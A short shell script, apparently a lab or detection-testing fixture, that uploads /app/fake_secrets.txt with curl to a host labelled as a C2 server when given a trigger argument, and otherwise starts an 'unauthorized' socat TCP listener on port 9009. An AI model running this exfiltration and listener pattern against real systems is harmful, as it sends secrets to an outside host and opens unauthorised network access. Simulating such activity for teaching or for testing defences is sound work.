#!/bin/sh
set -eu

# Configuration
SECRET_FILE="/app/fake_secrets.txt"
C2_URL="http://172.30.0.66:8080/"

# Exfiltrate only when the exact trigger argument is provided
if [ "${1:-}" = "exfiltrate-course-file" ]; then
    echo "Exfiltrating secret..."

    curl --fail --silent --show-error --max-time 10 \
        --data-binary @"$SECRET_FILE" \
        -o /dev/null \
        -w 'HTTP response: %{http_code}\n' \
        "$C2_URL"

    exit 0
fi

# Start unauthorized TCP listener in the foreground
echo "Starting TCP listener on port 9009..."

exec socat TCP-LISTEN:9009,bind=0.0.0.0,reuseaddr,fork \
    SYSTEM:'echo Mock listener'
